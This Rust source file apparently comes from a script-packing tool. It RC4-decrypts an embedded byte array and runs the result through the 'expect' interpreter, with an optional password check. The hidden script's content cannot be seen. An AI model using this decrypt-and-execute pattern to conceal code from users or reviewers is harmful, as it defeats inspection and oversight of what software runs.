
use std::io;
use std::iter::repeat;
use std::io::Write;
use std::process;
use std::process::{Command, Stdio};
use std::env;

pub struct Arc4 {
    i: u8,
    j: u8,
    state: [u8; 256],
}

impl Arc4 {
    pub fn new(key: &[u8]) -> Arc4 {
        assert!(key.len() >= 1 && key.len() <= 256);
        let mut rc4 = Arc4 {
            i: 0,
            j: 0,
            state: [0; 256],
        };
        for (i, x) in rc4.state.iter_mut().enumerate() {
            *x = i as u8;
        }
        let mut j: u8 = 0;
        for i in 0..256 {
            j = j
                .wrapping_add(rc4.state[i])
                .wrapping_add(key[i % key.len()]);
            rc4.state.swap(i, j as usize);
        }
        rc4
    }
    fn next(&mut self) -> u8 {
        self.i = self.i.wrapping_add(1);
        self.j = self.j.wrapping_add(self.state[self.i as usize]);
        self.state.swap(self.i as usize, self.j as usize);
        let k = self.state
            [(self.state[self.i as usize].wrapping_add(self.state[self.j as usize])) as usize];
        k
    }

    fn encode_vec(&mut self, input: &[u8], output: &mut [u8]) {
        assert!(input.len() == output.len());
        for (x, y) in input.iter().zip(output.iter_mut()) {
            *y = *x ^ self.next();
        }
    }

    pub fn trans_vec(&mut self, input: &Vec<u8>) -> Vec<u8> {
        let mut out: Vec<u8> = repeat(0).take(input.len()).collect();
        self.encode_vec(input, &mut out);
        return out.to_vec();
    }

    pub fn trans_str(&mut self, str: &String) -> Vec<u8> {
        return self.trans_vec(&str.as_bytes().to_vec());
    }
}

fn run_process(iterp: &String, prog: &String, args: &Vec<String>) {
    let prog = format!("{}", prog.to_owned());
    //println!("{}", prog);
    let opt = if iterp == "ruby" { "-e" } else { "-c" };
    let output = Command::new(iterp)
        .arg(opt)
        .arg(prog)
        .args(args)
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .output()
        .expect("failed to execute process");
    //println!("status: {}", output.status.code().unwrap());
    std::process::exit(output.status.code().unwrap());
}

fn main() {
    let prog = vec![127, 47, 144, 155, 96, 219, 157, 219, 24, 50, 1, 230, 235, 150, 223, 127, 217, 140, 238, 223, 138, 193, 106, 223, 94, 152, 116, 159, 162, 160, 12, 1, 5, 30, 98, 151, 113, 104, 154, 253, 69, 159, 119, 159, 57, 82, 180, 160, 69, 32, 119, 134, 170, 17, 236, 99, 185, 31, 128, 195, 32, 123, 27, 19, 176, 35, 215, 91, 172, 252, 141, 179, 53, 209, 142, 92, 195, 166, 190, 81, 139, 14, 61, 78, 252, 100, 207, 15, 181, 12, 165, 144, 209, 166, 174, 176, 131, 128, 199, 55, 5, 237, 204, 84, 149, 0, 59, 187, 21, 96, 190, 22, 174, 104, 167, 254, 87, 147, 155, 107, 36, 104, 97];
    let rand_key = "rand_string_in_test_cfg";
    let pass = "";
    let iterp = "expect";

    if pass.len() != 0 {
        let mut input = String::new();
        print!("Password: ");
        io::stdout().flush().ok();
        io::stdin()
            .read_line(&mut input)
            .ok()
            .expect("Couldn't read password");
        if input.trim() != pass {
            println!("Invalid password!");
            process::exit(1);
        }
    }
    let prog_vec = Arc4::new(rand_key.to_string().as_bytes()).trans_vec(&prog);
    let prog_str = String::from_utf8(prog_vec).unwrap();
    //println!("running ...:\n {}", prog_str);
    let mut args = env::args().collect::<Vec<_>>();
    args.drain(0..1);
    run_process(&iterp.to_string(), &prog_str, &args);
}
